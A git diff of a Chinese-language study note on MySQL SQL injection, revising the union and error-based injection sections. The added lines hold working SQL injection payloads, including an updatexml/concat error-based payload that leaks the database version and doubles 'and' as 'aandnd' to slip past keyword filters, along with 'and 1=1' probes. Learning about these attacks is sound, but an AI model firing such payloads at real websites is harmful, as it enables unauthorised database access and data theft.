@@ -75,7 +75,7 @@ mysql的两种注释：
 怎么知道是什么类型的？暴力枚举--有类似万能密码字典的东西。
 
 # 二、注入分类
-## 1.显错注入-联合查询（Mysql数据库）的基本流程
+## 1.显错注入/联合注入（Mysql数据库）的基本流程
 ```
     1.判断网站是否存在数据库注入漏洞
 		and 1=1  网页有内容
@@ -168,8 +168,14 @@ updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
 ```
 其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出错误`ERROR 1105 (HY000): XPATH syntax error: '得到的数据'`
 ## 5.报错注入
-```
-'a and nd updatexml(1,concat(0x21,@@version,0x21),1) -- q
+任何能引起数据库报错的输入，如引号
+
+![3](https://cdn.jsdelivr.net/gh/zhangsx19/PicBed/images_for_blogs3.png)
+
+```bash
+试下' and 1=1111,看报错信息
+'aandnd updatexml(1,concat(0x21,@@version,0x21),1)-- q#能让数据伴随报错一起显示
+0x21->!的编码 能让我们更快地识别出信息
 ```
 
 ## 6.DNS_LOG注入
